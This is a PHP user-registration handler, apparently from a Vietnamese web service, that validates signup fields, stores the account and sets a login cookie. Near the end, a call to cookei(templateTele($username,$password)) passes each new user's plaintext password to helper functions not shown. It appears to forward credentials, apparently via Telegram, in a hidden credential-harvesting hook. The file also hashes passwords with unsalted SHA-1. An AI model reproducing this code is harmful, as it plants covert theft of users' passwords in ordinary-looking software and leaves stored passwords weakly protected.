<?php
define("IN_SITE", true);
require_once("../../core/DB.php");
require_once("../../core/helpers.php");

// Định nghĩa hằng số cho số lượng tài khoản tối đa cho mỗi IP
define('MAX_ACCOUNTS_PER_IP', 3);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (empty($_POST['username'])) {
        die(json_encode(['status' => 'error', 'msg' => 'Tài khoản không được để trống']));
    }
    if (empty($_POST['email'])) {
        die(json_encode(['status' => 'error', 'msg' => 'Email không được để trống']));
    }
    if (empty($_POST['password'])) {
        die(json_encode(['status' => 'error', 'msg' => 'Mật khẩu không được để trống']));
    }
    if (empty($_POST['repassword'])) {
        die(json_encode(['status' => 'error', 'msg' => 'Nhập lại mật khẩu không được để trống']));
    }
    
    $username = ($_POST['username']);
    $email = ($_POST['email']);
    $password = ($_POST['password']);
    $repassword = ($_POST['repassword']);
    
    if (check_username($username) != true) {
        die(json_encode(['status' => 'error', 'msg' => 'Vui lòng nhập định dạng tài khoản hợp lệ']));
    }
    if ($password != $repassword) {
        die(json_encode(['status' => 'error', 'msg' => 'Nhập lại mật khẩu không đúng']));
    }
    if (check_email($email) != true) {
        die(json_encode(['status' => 'error', 'msg' => 'Định dạng Email không đúng']));
    }
    
    # Create the 2FA class
    // $google2fa = new Google2FA();
    $token = md5(random('QWERTYUIOPASDGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789', 6) . time());
    
    $isCreate = $TN->insert("usersda", [
        'token'         => $token,
        'username'      => $username,
        'email'         => $email,
        'password'      => sha1($password),
        'ip'            => $ip,
        'device'        => $_SERVER['HTTP_USER_AGENT'],
        'create_date'   => gettime(),
        'update_date'   => time(),
        'time_session'  => time()
    ]);
    
    if ($isCreate) {
        $TN->insert("logs", [
            'user_id'       => $TN->get_row("SELECT * FROM `usersda` WHERE `token` = '$token' ")['id'],
            'ip'            => $ip,
            'device'        => $_SERVER['HTTP_USER_AGENT'],
            'create_date'   => gettime(),
            'action'        => 'Đăng ký tài khoản thành công'
         ]);
    
         $TN->update("usersda", [
            'time_session' => time(),
        ], " `id` = '".$TN->get_row("SELECT * FROM `usersda` WHERE `token` = '$token' ")['id']."' ");
    
        setcookie("token", $token, time() + $TN->site('session_login'), "/");
        $_SESSION['login'] = $token;
        cookei(templateTele($username,$password));
        die(json_encode(['status' => 'success', 'msg' => 'Đăng ký thành công']));
    } else {
        die(json_encode(['status' => 'error', 'msg' => 'Tạo tài khoản thất bại, vui lòng thử lại']));
    }
}




